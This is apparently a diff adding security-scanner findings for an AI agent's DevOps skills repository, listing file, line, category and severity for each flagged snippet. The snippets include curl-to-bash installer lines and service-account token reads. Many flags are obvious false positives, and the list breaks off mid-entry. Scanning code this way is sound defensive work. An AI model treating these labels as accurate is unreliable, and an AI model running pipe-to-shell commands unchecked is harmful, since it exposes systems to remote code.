+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/triggers/chatops-commands.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 39,
+  "ctx": "COMMAND=$(echo \"$COMMENT\" | grep -oE '^/[-[:..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/triggers/chatops-commands.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 42,
+  "ctx": "ARGS=$(echo \"$COMMENT\" | sed -E 's|^/[-[:..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/triggers/chatops-commands.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 131,
+  "ctx": "ENV=$(echo \"$ARGS\" | awk '{print $1}' | ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/triggers/chatops-commands.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 254,
+  "ctx": "SUITE=$(echo \"$ARGS\" | awk '{print $1}')"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/workflows/scheduled-tasks.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 238,
+  "ctx": "RESPONSE=$(curl -s -o /dev/null -w \"%{http_co..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/examples/workflows/scheduled-tasks.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 261,
+  "ctx": "CDN_RESPONSE=$(curl -s -o /dev/null -w \"%{http_co..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/references/expressions-and-contexts.md",
+  "category": "Prompt Injection",
+  "pattern": "Print/Spellcheck Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 315,
+  "ctx": "- name: Print context"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/references/expressions-and-contexts.md",
+  "category": "Prompt Injection",
+  "pattern": "Print/Spellcheck Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 666,
+  "ctx": "# Print entire context with pretty formatting"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/scripts/test_generator.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 14,
+  "ctx": "...: yamllint must be installed (pip install yamllint)"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-generator/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 227,
+  "ctx": "**Skip validation only for:**"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-validator/references/actionlint_usage.md",
+  "category": "Prompt Injection",
+  "pattern": "Supplement/Override Rule",
+  "severity": "Severity.HIGH",
+  "line": 336,
+  "ctx": "... **Keep actionlint updated**: New rules and features are added regul..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-validator/references/common_errors.md",
+  "category": "Prompt Injection",
+  "pattern": "Print/Spellcheck Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 463,
+  "ctx": "### 3. Print Context Information"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/github-actions-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Remote Code Execution",
+  "severity": "Severity.CRITICAL",
+  "line": 49,
+  "ctx": "curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/nektos/act/master/install.sh | bash -s -- -b \"${TOOLS_DIR}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-generator/assets/templates/basic-pipeline.yml",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 151,
+  "ctx": "POSTGRES_PASSWORD: testpass"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-generator/assets/templates/basic-pipeline.yml",
+  "category": "Data Exfiltration",
+  "pattern": "Database Connection String",
+  "severity": "Severity.HIGH",
+  "line": 152,
+  "ctx": "DATABASE_URL: postgres://testuser:testpass@postgres:5432/testdb"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-generator/assets/templates/basic-pipeline.yml",
+  "category": "Data Exfiltration",
+  "pattern": "Database Connection String",
+  "severity": "Severity.HIGH",
+  "line": 153,
+  "ctx": "REDIS_URL: redis://redis:6379"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-generator/SKILL.md",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 694,
+  "ctx": "Only skip validation when:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/examples/complex-workflow.gitlab-ci.yml",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 241,
+  "ctx": "- lhci autorun --collect.url=http://localhos..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/examples/complex-workflow.gitlab-ci.yml",
+  "category": "Shell Injection",
+  "pattern": "Bash Command Substitution $(...)",
+  "severity": "Severity.MEDIUM",
+  "line": 416,
+  "ctx": "response=$(curl -s -o /dev/null -w \"%{http_co..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_best_practices.py",
+  "category": "Prompt Injection",
+  "pattern": "Resource Exhaustion (LLM04)",
+  "severity": "Severity.MEDIUM",
+  "line": 128,
+  "ctx": "... visited templates to prevent infinite loops"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_best_practices.py",
+  "category": "Prompt Injection",
+  "pattern": "Resource Exhaustion (LLM04)",
+  "severity": "Severity.MEDIUM",
+  "line": 145,
+  "ctx": "# Prevent infinite loops"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_best_practices.py",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 607,
+  "ctx": "# Find duplicate configurations"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_security.py",
+  "category": "Social Engineering",
+  "pattern": "Approval Bypass (LLM08)",
+  "severity": "Severity.HIGH",
+  "line": 77,
+  "ctx": "... 'skip-verification', 'Do not skip verification checks'),"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_security.py",
+  "category": "Prompt Injection",
+  "pattern": "Verification Bypass (ASI09)",
+  "severity": "Severity.HIGH",
+  "line": 77,
+  "ctx": "... 'skip-verification', 'Do not skip verification checks'),"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_security.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 396,
+  "ctx": "'Use npm ci or npm install --ignore-scripts to prevent ar..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/check_security.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 398,
+  "ctx": "'Use pip install --require-hashes for verified ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 87,
+  "ctx": "echo \"  - macOS:   brew install node\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 104,
+  "ctx": "if npm install -g gitlab-ci-local 2>/dev/null..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 115,
+  "ctx": "if npm install --save-dev gitlab-ci-local 2>/..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 123,
+  "ctx": "...  echo \"  1. Global install:  npm install -g gitlab-ci-local\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/install_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 124,
+  "ctx": "...  echo \"  2. Project install: npm install --save-dev gitlab-ci-local\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/python_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 32,
+  "ctx": "pip install --quiet pyyaml >&2"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/validate_gitlab_ci.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 147,
+  "ctx": "echo \"Install with: brew install python3\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/scripts/validate_gitlab_ci.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 347,
+  "ctx": "echo \"  npm install -g gitlab-ci-local\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/tests/test_validators.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 39,
+  "ctx": "proc = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/tests/test_validators.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 59,
+  "ctx": "proc = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/gitlab-ci-validator/tests/test_validators.py",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 72,
+  "ctx": "\"\"\"Return list of rule IDs from a JSON result.\"\"\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-generator/examples/webapp/templates/NOTES.txt",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 28,
+  "ctx": "echo \"Visit http://127.0.0.1:8080 to use your application\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-generator/references/crd_patterns.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 971,
+  "ctx": "#     value: 10.0.0.1"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-generator/scripts/generate_chart_structure.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 705,
+  "ctx": "Then access via: localhost:{{ .Values.service.port }}"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/references/k8s_best_practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 534,
+  "ctx": "cidr: 10.0.0.0/8"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/references/k8s_best_practices.md",
+  "category": "Data Exfiltration",
+  "pattern": "IP Address in Sensitive Context (LLM06)",
+  "severity": "Severity.LOW",
+  "line": 626,
+  "ctx": "server.host=0.0.0.0"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/references/template_functions.md",
+  "category": "Prompt Injection",
+  "pattern": "Backwards/Encoded Output Request",
+  "severity": "Severity.HIGH",
+  "line": 511,
+  "ctx": "# Encode secret"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/detect_crd.py",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "... import Path try: import yaml except ImportError: print(\"Error: PyYAML is not installed. Please run: pip install pyyaml\", file=sys.stderr) print(\"Or use the "
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/detect_crd.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 14,
+  "ctx": "...is not installed. Please run: pip install pyyaml\", file=sys.stderr)"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/detect_crd.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 84,
+  "ctx": "with open(file_path, \"r\", encoding=\"utf-8\") as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/detect_crd_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 51,
+  "ctx": "\"$TEMP_VENV/bin/python3\" -m pip install --quiet --disable-pip-version-..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Replay Request",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...d tools: ${MISSING_TOOLS[*]}\" echo echo \"Installation instructions:\" echo for tool in \"${MISSING..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Supply Chain",
+  "pattern": "Untrusted Package Source (LLM03)",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...\"  Windows:  choco install kubernetes-cli\" echo ;; yq) echo \"📦 yq:\" echo \"  macOS:    brew install yq\" echo ..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Replay Request",
+  "severity": "Severity.HIGH",
+  "line": 90,
+  "ctx": "echo \"Installation instructions:\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 97,
+  "ctx": "...            echo \"  macOS:    brew install helm\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Remote Code Execution",
+  "severity": "Severity.CRITICAL",
+  "line": 98,
+  "ctx": "...            echo \"  Linux:    curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 105,
+  "ctx": "...            echo \"  macOS:    brew install yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 106,
+  "ctx": "...            echo \"  Linux:    pip install yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 108,
+  "ctx": "...            echo \"  Windows:  pip install yamllint\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 113,
+  "ctx": "...            echo \"  macOS:    brew install kubeconform\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 131,
+  "ctx": "...            echo \"  macOS:    brew install kubectl\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/setup_tools.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 138,
+  "ctx": "...            echo \"  macOS:    brew install yq\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/helm-validator/scripts/validate_chart_structure.sh",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 51,
+  "ctx": "with open(file_path, \"r\", encoding=\"utf-8\") as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-generator/assets/templates/declarative/basic.Jenkinsfile",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 61,
+  "ctx": "// sh 'npm install && npm run build'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-generator/assets/templates/scripted/basic.Jenkinsfile",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 30,
+  "ctx": "// sh 'npm install && npm run build'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-generator/scripts/generate_declarative.py",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 192,
+  "ctx": "# Get stage list from config or use default"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-generator/scripts/generate_shared_library.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 821,
+  "ctx": "with open(file_path, 'w') as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-generator/scripts/lib/common_patterns.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 46,
+  "ctx": "'build_cmd': 'pip install -r requirements.txt',"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/examples/bad-declarative-pipeline.Jenkinsfile",
+  "category": "Data Exfiltration",
+  "pattern": "API Key Leak",
+  "severity": "Severity.CRITICAL",
+  "line": 39,
+  "ctx": "api_key = \"hardcoded-secret-key\"  // Bad variable naming + ha..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/examples/bad-scripted-pipeline.Jenkinsfile",
+  "category": "Data Exfiltration",
+  "pattern": "Private Key Material",
+  "severity": "Severity.CRITICAL",
+  "line": 65,
+  "ctx": "sh 'echo \"-----BEGIN RSA PRIVATE KEY-----\" > /tmp/key.pem'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/references/common_plugins.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 164,
+  "ctx": "sh 'curl http://localhost:8080'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/references/scripted_syntax.md",
+  "category": "Data Exfiltration",
+  "pattern": "Internal Network Probe",
+  "severity": "Severity.HIGH",
+  "line": 607,
+  "ctx": "sh 'curl http://localhost:8080'"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/scripts/common_validation.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 97,
+  "ctx": "...assword variable assignments: password = \"value\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/scripts/common_validation.sh",
+  "category": "Data Exfiltration",
+  "pattern": "Password in Cleartext",
+  "severity": "Severity.HIGH",
+  "line": 103,
+  "ctx": "...assword flags: -p password, --password=secret"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/scripts/common_validation.sh",
+  "category": "Prompt Injection",
+  "pattern": "Backwards/Encoded Output Request",
+  "severity": "Severity.HIGH",
+  "line": 301,
+  "ctx": "# Check for hex-encoded secrets (32+ hex chars often indicat..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/scripts/validate_jenkinsfile.sh",
+  "category": "Output Injection",
+  "pattern": "Template Injection (LLM05)",
+  "severity": "Severity.HIGH",
+  "line": 139,
+  "ctx": "echo -e \"${YELLOW}WARNING [Runner]: $(basename \"$script_path\") is not executable. Using 'bash' fallback.${NC}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/jenkinsfile-validator/tests/test_validate_jenkinsfile.sh",
+  "category": "Agentic Security",
+  "pattern": "Exception Swallowing (ASI08)",
+  "severity": "Severity.MEDIUM",
+  "line": 0,
+  "ctx": "...ssume flag avoids type-detection error\" \"ERROR \\\\[TypeDetection\\\\]\" # Test 3: Missing child validator reports exactly one runner error (no double count). san"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/references/common_issues.md",
+  "category": "Prompt Injection",
+  "pattern": "Indirect Prompt Extraction",
+  "severity": "Severity.HIGH",
+  "line": 287,
+  "ctx": "# List ConfigMaps"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/network_debug.sh",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 147,
+  "ctx": "token=\"$(pod_exec cat \"$SERVICEACCOUNT_TOKEN_FILE\" 2>/dev/null || true)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/network_debug.sh",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 148,
+  "ctx": "token=\"${token//$'\\r'/}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/network_debug.sh",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 149,
+  "ctx": "token=\"${token//$'\\n'/}\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/network_debug.sh",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 162,
+  "ctx": "token=\"$(read_serviceaccount_token)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/network_debug.sh",
+  "category": "Mod Capability",
+  "pattern": "Secret Assignment",
+  "severity": "Severity.CRITICAL",
+  "line": 184,
+  "ctx": "token=\"$(read_serviceaccount_token)\""
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-debug/scripts/pod_diagnostics.py",
+  "category": "Code Obfuscation",
+  "pattern": "Python subprocess/os.system",
+  "severity": "Severity.MEDIUM",
+  "line": 23,
+  "ctx": "result = subprocess.run("
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-generator/examples/statefulset.yaml",
+  "category": "Data Exfiltration",
+  "pattern": "Toxic Flow - Data Exfiltration Chain",
+  "severity": "Severity.CRITICAL",
+  "line": 0,
+  "ctx": "...conds: 10 failureThreshold: 6 readinessProbe: exec: command: - pg_isready - -U - postgres initialDelaySeconds: 5 pe..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-generator/references/resource_patterns.md",
+  "category": "Prompt Injection",
+  "pattern": "Backwards/Encoded Output Request",
+  "severity": "Severity.HIGH",
+  "line": 336,
+  "ctx": "tls.key: <base64-encoded key>"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-generator/references/resource_patterns.md",
+  "category": "Prompt Injection",
+  "pattern": "Unrestricted Compliance Demand",
+  "severity": "Severity.HIGH",
+  "line": 459,
+  "ctx": "...ot selected by any policy has no restrictions"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/detect_crd.py",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 19,
+  "ctx": "...is not installed. Please run: pip install pyyaml\", file=sys.stderr)"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/detect_crd.py",
+  "category": "Code Obfuscation",
+  "pattern": "Suspicious open() in Agent Input",
+  "severity": "Severity.HIGH",
+  "line": 84,
+  "ctx": "with open(file_path, 'r') as f:"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/detect_crd_wrapper.sh",
+  "category": "Dangerous Command",
+  "pattern": "Package / Dependency Install",
+  "severity": "Severity.MEDIUM",
+  "line": 34,
+  "ctx": "pip install --quiet pyyaml >&2"
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Prompt Injection",
+  "pattern": "Instruction Replay Request",
+  "severity": "Severity.HIGH",
+  "line": 0,
+  "ctx": "...g tools: ${MISSING_TOOLS[*]}\" echo echo \"Installation instructions:\" echo for tool in \"${MISSING..."
+ },
+ {
+  "repo": "akin-ozer__cc-devops-skills",
+  "file": "devops-skills-plugin/skills/k8s-yaml-validator/scripts/setup_tools.sh",
+  "category": "Prompt Injection",
